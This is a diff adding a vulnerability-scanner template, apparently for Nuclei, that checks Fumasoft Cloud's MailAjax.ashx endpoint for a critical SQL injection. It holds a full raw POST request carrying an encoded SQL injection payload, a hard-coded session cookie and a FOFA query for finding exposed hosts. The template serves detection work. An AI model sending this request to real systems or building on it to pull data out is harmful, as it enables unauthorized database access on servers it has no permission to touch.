@@ -1,0 +1,43 @@
+id: fumasoft-mailajax-sqli
+
+info:
+  name: Fumasoft Cloud MailAjax.ashx - SQL Injection
+  author: qwtd
+  severity: critical
+  description: |
+    There is a SQL injection vulnerability in the MailAjax.ashx file of Fumasoft Cloud. Attackers can obtain server permissions through the vulnerability
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="孚盟软件-孚盟云"
+  tags: Fumeng-Cloud
+
+http:
+  - raw:
+      - |
+        POST /Ajax/MailAjax.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: UserCookie={"LicNo":"","lastLoginIp":"","LicSelected":"cloud","ProductID":"M8","loginUser":"00210","userToken":"A39418D1C5EADEFD41E99B71976A531E24EC2C6B9E7D4CD460A406769A97CC9DE2966975679C521F499A8F215B51B65C4D067F57D94D260B6EF4C16094D56562"}
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        action=GetMailContactsCard&custFID=%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%287588%3D7588%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qkvzq1qzjkq'
+
+      - type: status
+        status:
+          - 500
+# digest: 4b0a00483046022100a96c14df3a5f43e1d97400f4dd130653d6038ddda7f077462ebe30063a6c53640221009a321d275b08d0a0662619884e6aa93e74b93b7c6c381123c5d4abdb9192c8e1:922c64590222798bb761d5b6d8e72950
